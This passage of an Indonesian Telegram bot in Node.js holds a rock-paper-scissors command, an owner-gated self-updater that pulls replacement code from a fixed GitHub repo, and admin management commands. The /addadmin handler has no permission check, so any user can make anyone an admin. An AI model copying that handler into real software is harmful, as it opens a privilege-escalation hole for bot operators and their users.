  const chatId = msg.chat.id;
  const userName = msg.from.first_name || "Pengguna";

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🪨 Batu", callback_data: "suit_batu" },
          { text: "✂️ Gunting", callback_data: "suit_gunting" },
          { text: "📄 Kertas", callback_data: "suit_kertas" },
        ],
      ],
    },
  };

  await bot.sendMessage(chatId, `👊 Hai ${userName}! Pilih tanganmu untuk bermain suit:`, options);
});


// ============== AUTO UPDATE index.js ==============




// ============== KONSTANTA REPO ==============
const Owner = "ridzz-oss";
const Repo = "data";
const BranchPath = "main/Ange.js";

const DEFAULT_RAW_URL =
  `https://raw.githubusercontent.com/${Owner}/${Repo}/${BranchPath}`;

// ============== KONFIGURASI ==============
const BOT_FILE = path.join(__dirname, "Ange.js");
const BACKUP_DIR = path.join(__dirname, "backups");
const MAX_FILE_SIZE = 2 * 1024 * 1024;
const CONFIRM_EXPIRES_MS = 10 * 60 * 1000;

const pendingUpdates = new Map();
let checkingUpdate = false;
let updateInProgress = false;

// SHA-256 dari isi file
function getSHA256(data) {
  return crypto
    .createHash("sha256")
    .update(data)
    .digest("hex");
}

// Download file dari Raw GitHub
async function downloadUpdate() {
  const parsed = new URL(DEFAULT_RAW_URL);

  if (
    parsed.protocol !== "https:" ||
    parsed.hostname !== "raw.githubusercontent.com"
  ) {
    throw new Error("URL harus berasal dari Raw GitHub.");
  }

  const response = await axios.get(DEFAULT_RAW_URL, {
    responseType: "arraybuffer",
    timeout: 30000,
    maxContentLength: MAX_FILE_SIZE,
    maxBodyLength: MAX_FILE_SIZE,
    headers: {
      "Cache-Control": "no-cache"
    }
  });

  const data = Buffer.from(response.data);

  if (!data.length) {
    throw new Error("File GitHub kosong.");
  }

  if (data.length > MAX_FILE_SIZE) {
    throw new Error("Ukuran file melebihi batas 2 MB.");
  }

  const beginning = data
    .subarray(0, 256)
    .toString("utf8")
    .trimStart();

  if (/^(?:<!doctype html|<html\b)/i.test(beginning)) {
    throw new Error("GitHub mengembalikan halaman HTML, bukan file JS.");
  }

  if (data.includes(0)) {
    throw new Error("File mengandung byte NUL yang tidak valid.");
  }

  return data;
}

// Validasi syntax sebelum file dipasang
function validateJavaScript(data, token) {
  const tempPath = path.join(
    __dirname,
    `.update-check-${process.pid}-${token}.js`
  );

  try {
    fs.writeFileSync(tempPath, data, { flag: "wx" });

    const result = spawnSync(
      process.execPath,
      ["--check", tempPath],
      {
        cwd: __dirname,
        encoding: "utf8",
        timeout: 15000
      }
    );

    if (result.error) {
      throw result.error;
    }

    if (result.status !== 0) {
      const details =
        result.stderr ||
        result.stdout ||
        "Syntax validation gagal.";

      throw new Error(details.slice(0, 1200));
    }
  } finally {
    try {
      if (fs.existsSync(tempPath)) {
        fs.unlinkSync(tempPath);
      }
    } catch {}
  }
}

// ============== COMMAND /update ==============
bot.onText(/^\/update(?:@\w+)?(?:\s|$)/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);

  // Hanya owner
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ Perintah ini hanya untuk owner bot."
    );
  }

  // Bersihkan konfirmasi yang kedaluwarsa
  for (const [token, pending] of pendingUpdates) {
    if (Date.now() > pending.expiresAt) {
      pendingUpdates.delete(token);
    }
  }

  if (checkingUpdate || updateInProgress) {
    return bot.sendMessage(
      chatId,
      "⏳ Proses update sedang berjalan."
    );
  }

  if (pendingUpdates.size > 0) {
    return bot.sendMessage(
      chatId,
      "⚠️ Masih ada konfirmasi update yang menunggu. Pilih Update atau Batal dahulu."
    );
  }

  checkingUpdate = true;

  try {
    await bot.sendMessage(
      chatId,
      "🔎 Mengecek pembaruan dari GitHub..."
    );

    if (!fs.existsSync(BOT_FILE)) {
      throw new Error("File lokal index.js tidak ditemukan.");
    }

    // Hash file lokal dan GitHub
    const localData = fs.readFileSync(BOT_FILE);
    const remoteData = await downloadUpdate();

    const localHash = getSHA256(localData);
    const remoteHash = getSHA256(remoteData);

    // Tidak ada perubahan
    if (localHash === remoteHash) {
      return bot.sendMessage(
        chatId,
        "✅ Bot sudah menggunakan file yang sama dengan GitHub.\n\n" +
        `SHA-256: ${localHash}`
      );
    }

    // Periksa syntax sebelum menawarkan pemasangan
    const token = crypto.randomBytes(8).toString("hex");
    validateJavaScript(remoteData, token);

    pendingUpdates.set(token, {
      userId,
      chatId,
      data: remoteData,
      localHash,
      remoteHash,
      expiresAt: Date.now() + CONFIRM_EXPIRES_MS
    });

    await bot.sendMessage(
      chatId,
      "🆕 PEMBARUAN TERSEDIA!\n\n" +
      `📦 Repo: ${Owner}/${Repo}\n` +
      `📁 File: ${BranchPath}\n\n` +
      `🔹 SHA lokal: ${localHash.slice(0, 16)}...\n` +
      `🔹 SHA GitHub: ${remoteHash.slice(0, 16)}...\n\n` +
      "Syntax JavaScript lolos validasi.\n" +
      "Mau mengganti index.js sekarang?",
      {
        reply_markup: {
          inline_keyboard: [[
            {
              text: "✅ Update sekarang",
              callback_data: `upd_yes:${token}`
            },
            {
              text: "❌ Batal",
              callback_data: `upd_no:${token}`
            }
          ]]
        }
      }
    );
  } catch (error) {
    console.error("[UPDATE CHECK ERROR]", error);

    await bot.sendMessage(
      chatId,
      "❌ Gagal mengecek update.\n\n" +
      String(error.message).slice(0, 1200)
    ).catch(() => {});
  } finally {
    checkingUpdate = false;
  }
});

// ============== TOMBOL UPDATE / BATAL ==============
bot.on("callback_query", async (query) => {
  const data = query.data || "";
  const isConfirm = data.startsWith("upd_yes:");
  const isCancel = data.startsWith("upd_no:");

  // Abaikan callback milik fitur bot lain
  if (!isConfirm && !isCancel) return;

  const token = data.slice(data.indexOf(":") + 1);
  const pending = pendingUpdates.get(token);

  if (!pending) {
    return bot.answerCallbackQuery(query.id, {
      text: "Konfirmasi tidak ditemukan atau sudah kedaluwarsa.",
      show_alert: true
    }).catch(() => {});
  }

  // Pastikan hanya owner peminta yang bisa menekan tombol
  if (
    String(query.from.id) !== pending.userId ||
    !isOwner(query.from.id)
  ) {
    return bot.answerCallbackQuery(query.id, {
      text: "Tombol ini bukan milikmu.",
      show_alert: true
    }).catch(() => {});
  }

  if (Date.now() > pending.expiresAt) {
    pendingUpdates.delete(token);

    await bot.answerCallbackQuery(query.id, {
      text: "Konfirmasi sudah kedaluwarsa.",
      show_alert: true
    }).catch(() => {});

    return;
  }

  if (isCancel) {
    pendingUpdates.delete(token);

    await bot.answerCallbackQuery(query.id, {
      text: "Update dibatalkan."
    }).catch(() => {});

    return bot.editMessageText(
      "❎ Update dibatalkan.\nFile lokal tidak diubah.",
      {
        chat_id: pending.chatId,
        message_id: query.message.message_id
      }
    ).catch(() => {});
  }

  if (updateInProgress) {
    return bot.answerCallbackQuery(query.id, {
      text: "Update sedang berlangsung.",
      show_alert: true
    }).catch(() => {});
  }

  updateInProgress = true;
  pendingUpdates.delete(token);

  await bot.answerCallbackQuery(query.id, {
    text: "Memulai update..."
  }).catch(() => {});

  await bot.editMessageText(
    "⏳ Memvalidasi dan memasang pembaruan...",
    {
      chat_id: pending.chatId,
      message_id: query.message.message_id
    }
  ).catch(() => {});

  let replaced = false;
  let tempPath;

  try {
    // Pastikan file lama masih tersedia
    if (!fs.existsSync(BOT_FILE)) {
      throw new Error("File index.js lokal tidak ditemukan.");
    }

    // Validasi ulang data yang akan dipasang
    validateJavaScript(pending.data, token);

    // Backup versi lama dengan nama unik
    fs.mkdirSync(BACKUP_DIR, { recursive: true });

    const timestamp = new Date()
      .toISOString()
      .replace(/[:.]/g, "-");

    const backupPath = path.join(
      BACKUP_DIR,
      `index-${timestamp}-${token}.js`
    );

    fs.copyFileSync(
      BOT_FILE,
      backupPath,
      fs.constants.COPYFILE_EXCL
    );

    // Tulis file sementara pada folder yang sama
    tempPath = path.join(
      __dirname,
      `.index-update-${process.pid}-${token}.js`
    );

    const oldMode = fs.statSync(BOT_FILE).mode & 0o777;

    fs.writeFileSync(tempPath, pending.data, {
      flag: "wx",
      mode: oldMode
    });

    // Ganti file dengan rename atomik pada filesystem yang sama
    fs.renameSync(tempPath, BOT_FILE);
    tempPath = undefined;
    replaced = true;

    await bot.sendMessage(
      pending.chatId,
      "✅ UPDATE BERHASIL!\n\n" +
      `📦 Repo: ${Owner}/${Repo}\n` +
      "📄 File: index.js\n" +
      `💾 Backup: backups/${path.basename(backupPath)}\n\n` +
      "♻️ Proses akan keluar agar PM2 menjalankan ulang bot."
    ).catch((error) => {
      console.error("[UPDATE MESSAGE ERROR]", error.message);
    });

    // PM2 harus mengelola proses ini dengan autorestart aktif
    setTimeout(() => {
      process.exit(0);
    }, 1500);

  } catch (error) {
    console.error("[UPDATE APPLY ERROR]", error);

    await bot.sendMessage(
      pending.chatId,
      replaced
        ? "⚠️ File sudah diganti, tetapi ada masalah setelah penggantian. Periksa log dan status PM2."
        : "❌ Update gagal. File index.js lama tidak diganti.\n\n" +
          String(error.message).slice(0, 1200)
    ).catch(() => {});
  } finally {
    if (tempPath) {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      } catch {}
    }

    updateInProgress = false;
  }
});

// ============== COMMAND /cekrepo ==============
bot.onText(/^\/cekrepo(?:@\w+)?(?:\s|$)/i, async (msg) => {
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "❌ Hanya owner.");
  }

  return bot.sendMessage(
    msg.chat.id,
    `🔗 Raw URL:\n${DEFAULT_RAW_URL}`
  );
});

console.log(
  `✅ Auto Update siap: ${Owner}/${Repo} -> ${BranchPath}`
);
// ============== SELESAI AUTO UPDATE ==============

//=====================================
// === COMMAND ===
//colong adp

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});
